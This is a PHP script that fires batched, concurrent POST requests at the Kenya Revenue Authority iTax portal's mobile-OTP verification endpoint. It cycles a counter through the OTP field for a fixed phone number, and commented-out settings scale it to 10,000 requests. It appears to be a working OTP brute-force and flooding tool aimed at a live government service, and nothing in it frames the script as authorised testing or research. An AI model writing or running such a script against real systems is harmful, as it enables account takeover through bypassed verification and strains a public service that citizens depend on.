<?php
function sendConcurrentPosts(array $urls, array $postFields): array
{
    $multiHandle = curl_multi_init();
    $curlHandles = [];

    foreach ($urls as $i => $url) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($postFields),
            CURLOPT_TIMEOUT => 10, // timeout per request
        ]);
        curl_multi_add_handle($multiHandle, $ch);
        $curlHandles[$i] = $ch;
    }

    $running = null;
    do {
        curl_multi_exec($multiHandle, $running);
        curl_multi_select($multiHandle);
    } while ($running > 0);

    $responses = [];
    foreach ($curlHandles as $i => $ch) {
        $responses[$i] = curl_multi_getcontent($ch);
        curl_multi_remove_handle($multiHandle, $ch);
        curl_close($ch);
    }

    curl_multi_close($multiHandle);
    return $responses;
}

// === Batch Setup ===
$totalRequests = 20;
$concurrency = 10;
// $totalRequests = 10000;
// $concurrency = 40;
$batches = ceil($totalRequests / $concurrency);
$totalTimeSeconds = 900;
$delayBetweenBatches = $totalTimeSeconds / $batches; // ~3.33 seconds

$targetUrl = 'https://itax.kra.go.ke/KRA-Portal/dwr/call/plaincall/FetchRegistrationDtl.verifyMobileOtp.dwr';


echo "Starting $batches batches of $concurrency requests...\n" . PHP_EOL;

for ($i = 0; $i < $batches; $i++) {
    $postData =  [
        'callCount' => '1',
        'windowName' => 'DWR-F9740062AC50C0A7919CCE0110C5CE12',
        'c0-scriptName' => 'FetchRegistrationDtl',
        'c0-methodName' => 'verifyMobileOtp',
        'c0-id' => '0',
        'c0-param0' => 'string:' . $i,
        'c0-param1' => 'string:0700000123',
        'c0-param2' => 'string:42945',
        'c0-param3' => 'string:42945',
        'c0-param4' => 'string:SMSOTP',
        'batchId' => '1',
        'page' => '/KRA-Portal/eRegIndi.htm?actionCode=loadIndiOnlineForm',
        'httpSessionId' => '',
        'scriptSessionId' => '3F1E7766883A38585F579768C5B4BDB3'
    ];
    $batchUrls = array_fill(0, $concurrency, $targetUrl);

    echo "Sending batch " . ($i + 1) . " of $batches...\n" . PHP_EOL;
    $responses = sendConcurrentPosts($batchUrls, $postData);

    // Handle or log responses here if needed
    foreach ($responses as $j => $resp) {
        echo "Batch " . ($i + 1) . " - Response " . ($j + 1) . ": " . $resp . "...\n" . PHP_EOL;
    }

    // Don't wait after the final batch
    if ($i < $batches - 1) {
        usleep((int)($delayBetweenBatches * 1_000_000)); // convert seconds to microseconds
    }
}

echo "✅ All $totalRequests requests completed.\n" . PHP_EOL;
